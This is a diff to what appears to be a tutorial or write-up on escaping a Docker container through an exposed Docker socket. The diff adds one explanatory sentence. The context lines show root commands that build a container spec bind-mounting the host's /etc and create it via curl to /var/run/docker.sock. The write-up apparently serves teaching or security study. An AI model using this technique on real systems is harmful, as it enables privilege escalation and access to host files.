@@ -231,6 +231,8 @@ Now, we minify it and store it in `container.json`:
 root@945784f80056:/# echo -e '{"Image":"debian:buster-slim","Cmd":["/bin/bash"],"OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/mount"}]}' > container.json
 ```
 
+Then, we post it to `/containers/create` using POST verb:
+
 ```
 root@945784f80056:/# curl -XPOST --header "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
 {"Id":"f7365a47d65b5ff0d372191f0dcb55b9ef5823e51cb1fcd20ff420352d116408","Warnings":[]}
